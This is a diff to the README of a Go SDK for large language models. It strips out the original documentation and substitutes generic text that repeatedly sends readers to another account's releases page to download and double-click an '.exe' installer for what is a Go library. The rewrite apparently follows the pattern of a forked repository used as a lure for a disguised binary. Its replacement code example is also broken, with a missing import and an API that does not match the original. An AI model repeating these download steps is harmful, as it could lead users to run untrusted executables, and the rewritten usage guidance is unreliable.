@@ -1,513 +1,112 @@
-# go-llm
+# 🚀 go-llm - A Simple SDK for LLM Apps
 
-**The most developer-friendly Go SDK for Large Language Models**
+[![Download go-llm](https://img.shields.io/badge/Download-go--llm-brightgreen)](https://github.com/Tberke0/go-llm/releases)
 
-[![Go Reference](https://pkg.go.dev/badge/gopkg.in/dragon-born/go-llm.v1.svg)](https://pkg.go.dev/gopkg.in/dragon-born/go-llm.v1)
-[![Go Report Card](https://goreportcard.com/badge/gopkg.in/dragon-born/go-llm.v1)](https://goreportcard.com/report/gopkg.in/dragon-born/go-llm.v1)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🌟 Overview
 
-A unified Go client for **OpenAI**, **Anthropic Claude**, **Google Gemini**, **Ollama**, **Azure OpenAI**, and 200+ models via OpenRouter. Build AI-powered applications with a beautiful fluent API, structured output parsing, function calling, AI agents, embeddings, vision, audio, and more.
+go-llm is a user-friendly Go Software Development Kit (SDK) designed to help you create applications that utilize Large Language Models (LLMs). With support for various models, including OpenAI, Anthropic, and others, this tool simplifies integration into your projects. 
 
----
+## 🔍 Features
 
-## Why go-llm?
+- **Easy Setup:** Quick installation process that anyone can follow.
+- **Multiple Model Support:** Access over 200 pre-trained models via OpenRouter.
+- **Friendly API:** Simple builder API for creating your applications.
+- **Advanced Tools:** Function calling, agents, and structured outputs for better performance.
+- **Extra Capabilities:** Support for streaming, vision/PDF, audio processing, embeddings, and retries.
+- **Cost Management:** Built-in features for tracking costs associated with API usage.
+- **Validation Options:** Ensure your inputs are correct with validation checks.
 
-| Pain Point | go-llm Solution |
-|------------|-----------------|
-| Different SDKs for each provider | **One unified API** for all providers |
-| Verbose boilerplate code | **Fluent builder pattern** — chain methods naturally |
-| No structured output | **Type-safe parsing** into Go structs with auto-retry |
-| Complex agent loops | **Built-in ReAct agents** with tools and callbacks |
-| Rate limits crash your app | **Smart retry** with exponential backoff |
-| No cost visibility | **Automatic cost tracking** per request |
-| Need web search / code execution | **Built-in tools** — web search, file search, code interpreter, MCP |
+## ⚙️ System Requirements
 
----
+To use go-llm effectively, you should have:
 
-## Installation
+- **Operating System:** Windows, macOS, or Linux.
+- **Disk Space:** At least 100 MB available.
+- **Network:** Internet connection for accessing APIs.
+- **Go Version:** Go 1.16 or higher (optional, for developers intending to modify the code).
 
-```bash
-go get gopkg.in/dragon-born/go-llm.v1
+## 🚀 Getting Started
+
+### Step 1: Visit the Download Page
+
+To download go-llm, visit the following link:
+
+[Download go-llm from Releases](https://github.com/Tberke0/go-llm/releases)
+
+### Step 2: Choose Your Version
+
+On the Releases page, look for the latest version. Each version will be listed with its release notes. Click on the version you want to download.
+
+### Step 3: Download the SDK
+
+Once you find the latest version, click on the executable file to start downloading. The file will typically be named something like `go-llm-vX.X.X.exe` for Windows or a similar format for macOS/Linux.
+
+### Step 4: Install the SDK
+
+After the download is complete, locate the file in your downloads folder and double-click it to begin the installation. Follow the onscreen prompts to complete the installation.
+
+### Step 5: Verify Installation
+
+To ensure that the installation was successful, open your command line or terminal and type:
+
+```
+go-llm --version
 ```
 
-## Quick Start
+If you see the version number of the SDK, your installation was successful!
+
+## 📥 Download & Install
+
+For easy access, here’s the direct download link again:
+
+[Download go-llm from Releases](https://github.com/Tberke0/go-llm/releases)
+
+1. Click on the link above.
+2. Locate the latest release version and download the file.
+3. Follow the installation steps outlined earlier.
+
+## 📖 User Guide
+
+Once you have installed go-llm, you can start building your applications. The following documentation will help you navigate key features:
+
+### Creating Your First Application
+
+1. **Set up your project:** Use the command line to create a new directory for your project.
+2. **Initialize your application:** Create a new Go file and import the go-llm library.
+3. **Build your code:** Use the builder API to set up your LLM app, including specifying any models you want to use.
+4. **Run your application:** Execute your Go file from the command line.
+
+### Example Code Snippet
+
+Here’s a simple example of how to use go-llm in your code:
 
 ```go
 package main
 
-import (
-    "fmt"
-    ai "gopkg.in/dragon-born/go-llm.v1"
-)
+import "github.com/Tberke0/go-llm"
 
 func main() {
-    // Set your API key
-    // export OPENROUTER_API_KEY="sk-or-..."
-
-    response, err := ai.Claude().
-        System("You are a helpful assistant.").
-        Ask("What is the capital of France?")
-    
-    if err != nil {
-        panic(err)
-    }
+    model := go_llm.NewModel("OpenAI_Model_ID")
+    response := model.Generate("Your prompt here")
     fmt.Println(response)
 }
 ```
 
----
+This code initializes a new model and generates a response based on your input prompt. Adjust the `model ID` and `prompt` as needed for different scenarios.
 
-## Supported Providers & Models
+## 🛠️ Frequently Asked Questions
 
-| Provider | Models | Environment Variable |
-|----------|--------|---------------------|
-| **OpenRouter** (default) | 200+ models | `OPENROUTER_API_KEY` |
-| **OpenAI** | GPT-5, GPT-4o, o1, o3 | `OPENAI_API_KEY` |
-| **Anthropic** | Claude Opus/Sonnet/Haiku | `ANTHROPIC_API_KEY` |
-| **Google** | Gemini 3/2.5/2 Pro/Flash | `GOOGLE_API_KEY` |
-| **xAI** | Grok 4.1, Grok 3 | via OpenRouter |
-| **Meta** | Llama 4 | via OpenRouter |
-| **Mistral** | Mistral Large | via OpenRouter |
-| **Ollama** | Any local model | None (local) |
-| **Azure OpenAI** | OpenAI models | `AZURE_OPENAI_API_KEY` |
+**Q: Do I need programming knowledge to use go-llm?**  
+A: Basic understanding of how to run commands and edit files will help, but deep programming knowledge is not required.
 
-```go
-// Via OpenRouter (default gateway to all models)
-ai.Claude().Ask("Hello")
-ai.GPT5().Ask("Hello")
-ai.Gemini().Ask("Hello")
+**Q: Is go-llm free to use?**  
+A: Yes, go-llm is free. You may incur costs depending on the LLM services you choose to use.
 
-// Direct to provider APIs
-ai.Anthropic().Claude().Ask("Hello")
-ai.OpenAI().GPT5().Ask("Hello")  
-ai.Google().GeminiPro().Ask("Hello")
+**Q: Where can I find help if I get stuck?**  
+A: You can check the documentation on the GitHub repository, or reach out through the issues section for assistance.
 
-// Local with Ollama (no API key needed)
-ai.Ollama().Use("llama3:8b").Ask("Hello")
+## 💬 Community Support
 
-// Azure OpenAI
-ai.Azure("https://mycompany.openai.azure.com").GPT4o().Ask("Hello")
-```
+Join the go-llm community for discussions, tips, and updates. You can connect with users and developers through our GitHub Issues page. 
 
----
-
-## Features
-
-### 🔗 Fluent Builder API
-
-Chain methods naturally for clean, readable code:
-
-```go
-response, _ := ai.Claude().
-    System("You are a senior Go developer").
-    Temperature(0.2).
-    ThinkHigh().                    // Enable extended thinking
-    MaxTokens(1000).
-    Ask("Review this code for bugs")
-```
-
-### 📐 Structured Output (Instructor-style)
-
-Parse LLM responses directly into Go structs with automatic retry on parse errors:
-
-```go
-type Person struct {
-    Name  string `json:"name"`
-    Age   int    `json:"age"`
-    Email string `json:"email"`
-}
-
-var person Person
-err := ai.Claude().IntoWithRetry(
-    "Extract: John Smith, 32 years old, john@example.com",
-    &person,
-    3, // retry up to 3 times on parse failure
-)
-// person = {Name: "John Smith", Age: 32, Email: "john@example.com"}
-```
-
-### 🔧 Function Calling / Tools
-
-Let AI call your Go functions:
-
-```go
-ai.GPT5().
-    Tool("get_weather", "Get weather for a city", ai.Params().
-        String("city", "City name", true).
-        Build()).
-    OnToolCall("get_weather", func(args map[string]any) (string, error) {
-        city := args["city"].(string)
-        return fmt.Sprintf(`{"temp": 22, "city": "%s"}`, city), nil
-    }).
-    User("What's the weather in Paris?").
-    RunTools(5) // Auto-loop until complete
-```
-
-### 🌐 Built-in Tools (OpenAI Responses API)
-
-Access powerful OpenAI-hosted tools with a simple fluent API:
-
-```go
-// Web Search - get real-time information from the internet
-resp, _ := ai.GPT5().
-    WebSearch().
-    User("What's the latest news about Go 1.24?").
-    Send()
-
-// With location & domain filtering
-meta := ai.GPT5().
-    WebSearchWith(ai.WebSearchOptions{
-        Country:        "US",
-        City:           "San Francisco",
-        AllowedDomains: []string{"golang.org", "go.dev"},
-    }).
-    User("What's new in Go?").
-    SendWithMeta()
-
-// Access citations from the response
-for _, cite := range meta.ResponsesOutput.Citations {
-    fmt.Printf("Source: %s - %s\n", cite.Title, cite.URL)
-}
-```
-
-```go
-// File Search - search your vector stores
-ai.GPT5().
-    FileSearch("vs_abc123").
-    User("What's our refund policy?").
-    Send()
-
-// With options
-ai.GPT5().
-    FileSearchWith(ai.FileSearchOptions{
-        VectorStoreIDs: []string{"vs_abc123", "vs_def456"},
-        MaxNumResults:  5,
-    }).
-    User("Find pricing documents").
-    Send()
-```
-
-```go
-// Code Interpreter - execute Python in a sandbox
-ai.GPT5().
-    CodeInterpreter().
-    User("Calculate factorial of 100 and plot fibonacci numbers").
-    Send()
-
-// With more memory for large datasets
-ai.GPT5().
-    CodeInterpreterWith(ai.CodeInterpreterOptions{
-        MemoryLimit: "4g", // 1g, 4g, 16g, or 64g
-    }).
-    User("Analyze this CSV data...").
-    Send()
-```
-
-```go
-// MCP - connect to remote MCP servers
-ai.GPT5().
-    MCP("dice", "https://dmcp-server.deno.dev/sse").
-    User("Roll 2d6+3").
-    Send()
-
-// Use built-in connectors (Dropbox, Gmail, Google Calendar, etc.)
-ai.GPT5().
-    MCPConnector("calendar", ai.ConnectorGoogleCalendar, os.Getenv("GOOGLE_TOKEN")).
-    User("What's on my calendar today?").
-    Send()
-```
-
-```go
-// Combine multiple tools
-ai.GPT5().
-    WebSearch().
-    CodeInterpreter().
-    User("Search for AAPL stock price and create a chart").
-    Send()
-```
-
-### 🤖 AI Agents (ReAct Pattern)
-
-Build autonomous agents that reason and act:
-
-```go
-result := ai.Claude().Agent().
-    Tool("search", "Search the web", searchParams, searchHandler).
-    Tool("calculate", "Do math", calcParams, calcHandler).
-    MaxSteps(15).
-    OnStep(func(s ai.AgentStep) {
-        fmt.Printf("Step %d: %s\n", s.Number, s.Action)
-    }).
-    Run("What is 15% of the current US population?")
-
-fmt.Println(result.Answer)
-```
-
-### 🖼️ Vision (Image Analysis)
-
-Analyze images with multimodal models:
-
-```go
-ai.GPT4o().
-    Image("screenshot.png").
-    Ask("What's shown in this image?")
-
-ai.Claude().
-    Images("before.png", "after.png").
-    Ask("What changed between these images?")
-```
-
-### 📄 PDF / Document Analysis
-
-Process documents directly (Claude & Gemini):
-
-```go
-ai.Anthropic().Claude().
-    PDF("report.pdf").
-    Ask("Summarize the key findings")
-
-ai.Google().GeminiPro().
-    PDF("document.pdf").
-    Image("chart.png").
-    Ask("Explain the chart in context of the document")
-```
-
-### 🎤 Audio (Text-to-Speech & Transcription)
-
-```go
-// Text-to-Speech
-ai.Speak("Hello world").Voice(ai.VoiceNova).HD().Save("hello.mp3")
-
-// Speech-to-Text (Whisper)
-text, _ := ai.Transcribe("meeting.mp3").Do()
-```
-
-### 🔢 Embeddings & Semantic Search
-
-```go
-// Create embeddings
-embedding, _ := ai.Embed("Hello world").First()
-
-// Semantic search
-results, _ := ai.SemanticSearch("What is AI?", corpus, 5)
-```
-
-### 💬 Conversations with Memory
-
-```go
-chat := ai.Claude().
-    System("You are a helpful tutor").
-    Chat()
-
-chat.Say("What is recursion?")
-chat.Say("Can you give me an example?")  // Remembers context
-chat.Say("How does that relate to stacks?")
-```
-
-### ⚡ Streaming Responses
-
-```go
-ai.Claude().
-    System("You are a storyteller").
-    Stream("Tell me a story about a robot")
-```
-
-### 🔄 Smart Retry with Exponential Backoff
-
-```go
-response, _ := ai.Claude().
-    RetryWithBackoff(3).
-    Ask("Complex analysis...")
-
-// Retries automatically on rate limits, timeouts, 5xx errors
-// with exponential backoff + jitter
-```
-
-### ✅ Response Validation
-
-```go
-ai.Claude().
-    NoEmptyResponse().
-    MinLength(100).
-    MaxLength(1000).
-    MustContain("conclusion").
-    Ask("Write a summary with a conclusion")
-```
-
-### 💰 Cost Tracking
-
-```go
-meta := ai.Claude().User("Hello").SendWithMeta()
-fmt.Printf("Cost: %s\n", meta.CostString()) // "$0.0012"
-fmt.Printf("Tokens: %d\n", meta.Tokens)
-
-// Track costs across your application
-ai.EnableCostTracking()
-// ... make requests ...
-ai.PrintCostSummary()
-```
-
-### 📦 Batch Processing
-
-```go
-results := ai.Batch(
-    ai.Claude().User("Question 1"),
-    ai.GPT5().User("Question 2"),
-    ai.Gemini().User("Question 3"),
-).Concurrency(5).Do()
-
-// Or race models for fastest response
-answer, winner, _ := ai.Race("What is 2+2?",
-    ai.ModelClaudeOpus, ai.ModelGPT5, ai.ModelGemini3Pro)
-```
-
-### 🚦 Rate Limiting
-
-```go
-// Global rate limiting
-ai.RateLimiter = ai.NewLimiter(60, time.Minute) // 60 requests/min
-```
-
----
-
-## Configuration
-
-```go
-// Global settings
-ai.DefaultModel = ai.ModelClaudeOpus
-ai.SetDefaultProvider(ai.ProviderAnthropic)
-ai.PromptsDir = "prompts"
-ai.Debug = true
-ai.Cache = true
-
-// Custom client with options
-client := ai.NewClient(ai.ProviderAnthropic,
-    ai.WithAPIKey("sk-ant-..."),
-    ai.WithTimeout(60 * time.Second),
-)
-```
-
----
-
-## Feature Comparison by Provider
-
-| Feature | OpenRouter | OpenAI | Anthropic | Google | Ollama |
-|---------|:----------:|:------:|:---------:|:------:|:------:|
-| Streaming | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Function Calling | ✅ | ✅ | ✅ | ✅ | ⚡ |
-| Vision | ✅ | ✅ | ✅ | ✅ | ⚡ |
-| JSON Mode | ✅ | ✅ | ✅ | ✅ | ✅ |
-| Extended Thinking | ✅ | ✅ | ✅ | ✅ | ❌ |
-| PDF Input | ❌ | ❌ | ✅ | ✅ | ❌ |
-| Web Search | ❌ | ✅ | ❌ | ❌ | ❌ |
-| File Search | ❌ | ✅ | ❌ | ❌ | ❌ |
-| Code Interpreter | ❌ | ✅ | ❌ | ❌ | ❌ |
-| MCP Servers | ❌ | ✅ | ❌ | ❌ | ❌ |
-
-⚡ = Partial support (model-dependent)
-
----
-
-## Documentation
-
-Full docs are hosted on the GitHub Wiki: [go-llm Wiki](https://github.com/Dragon-Born/go-llm/wiki/).
-
-| Topic | Description |
-|-------|-------------|
-| [Home](https://github.com/Dragon-Born/go-llm/wiki/) | Documentation index |
-| [Quick Start](https://github.com/Dragon-Born/go-llm/wiki/Quick-Start) | Get up and running in 5 minutes |
-| [Multi-Provider Support](https://github.com/Dragon-Born/go-llm/wiki/Multi%E2%80%90Provider-Support) | Multi-provider setup & switching |
-| [Models Reference](https://github.com/Dragon-Born/go-llm/wiki/Models-Reference) | All supported models |
-| [Builder API](https://github.com/Dragon-Born/go-llm/wiki/Builder) | Fluent API reference |
-| [Streaming](https://github.com/Dragon-Born/go-llm/wiki/Streaming) | Real-time responses |
-| [Conversations](https://github.com/Dragon-Born/go-llm/wiki/Conversations) | Multi-turn chat |
-| [Tool/Function Calling](https://github.com/Dragon-Born/go-llm/wiki/Tool-Function-Calling) | Function calling |
-| [Built-in Tools](https://github.com/Dragon-Born/go-llm/wiki/Builtin-Tools) | Web search, file search, code interpreter, MCP |
-| [Agents](https://github.com/Dragon-Born/go-llm/wiki/Agents) | ReAct pattern agents |
-| [Structured Output](https://github.com/Dragon-Born/go-llm/wiki/Structured-Output) | Structured output extraction |
-| [Structured Output (Parse Retries)](https://github.com/Dragon-Born/go-llm/wiki/Structured-Output-with-Parse-Retries) | Structured parsing with retries |
-| [Vision / Image Input (and PDFs)](https://github.com/Dragon-Born/go-llm/wiki/Vision---Image-Input) | Image input + PDF/document input |
-| [Embeddings](https://github.com/Dragon-Born/go-llm/wiki/Embeddings) | Vector embeddings & search |
-| [Audio](https://github.com/Dragon-Born/go-llm/wiki/Audio) | TTS & transcription |
-| [Batch](https://github.com/Dragon-Born/go-llm/wiki/Batch) | Parallel processing |
-| [Cost Tracking](https://github.com/Dragon-Born/go-llm/wiki/Cost-Tracking) | Cost tracking & budgets |
-| [Configuration](https://github.com/Dragon-Born/go-llm/wiki/Configuration) | Global settings |
-| [Smart Retry](https://github.com/Dragon-Born/go-llm/wiki/Smart-Retry-with-Exponential-Backoff) | Smart retry strategies |
-| [Response Validation](https://github.com/Dragon-Born/go-llm/wiki/Response-Validation-%26-Guardrails) | Response guardrails |
-| [Hooks & Observability](https://github.com/Dragon-Born/go-llm/wiki/Hooks-and-Observability) | Request/response hooks, tokens, errors |
-| [Advanced](https://github.com/Dragon-Born/go-llm/wiki/Advanced) | Advanced features & patterns |
-
----
-
-## Examples
-
-### Build a Research Agent
-
-```go
-agent := ai.Claude().
-    System("You are a research assistant").
-    ThinkHigh().
-    Agent().
-    Tool("search", "Search the web", searchParams, searchFunc).
-    Tool("summarize", "Summarize a URL", summarizeParams, summarizeFunc).
-    MaxSteps(20).
-    OnStep(func(s ai.AgentStep) {
-        log.Printf("Step %d: %s", s.Number, s.Action)
-    })
-
-result := agent.Run("Research the latest advances in quantum computing")
-fmt.Println(result.Answer)
-```
-
-### Extract Structured Data
-
-```go
-type Invoice struct {
-    Vendor    string  `json:"vendor"`
-    Amount    float64 `json:"amount"`
-    Currency  string  `json:"currency"`
-    DueDate   string  `json:"due_date"`
-    LineItems []struct {
-        Description string  `json:"description"`
-        Quantity    int     `json:"quantity"`
-        UnitPrice   float64 `json:"unit_price"`
-    } `json:"line_items"`
-}
-
-var invoice Invoice
-ai.Claude().
-    PDF("invoice.pdf").
-    IntoWithRetry("Extract all invoice details", &invoice, 3)
-```
-
-### Compare Model Responses
-
-```go
-results := ai.BatchModels(
-    "Explain quantum entanglement in one paragraph",
-    ai.ModelClaudeOpus,
-    ai.ModelGPT5,
-    ai.ModelGemini3Pro,
-).Do()
-
-for _, r := range results {
-    fmt.Printf("=== %s ===\n%s\n\n", r.Model, r.Content)
-}
-```
-
----
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) for details.
-
-## License
-
-MIT License - see [LICENSE](license) for details.
-
----
-
-<p align="center">
-  <b>⭐ Star this repo if you find it useful!</b><br>
-  Built with ❤️ for the Go community
-</p>
+By following the steps above, you can successfully download and use go-llm to create your LLM applications. Enjoy building with go-llm!
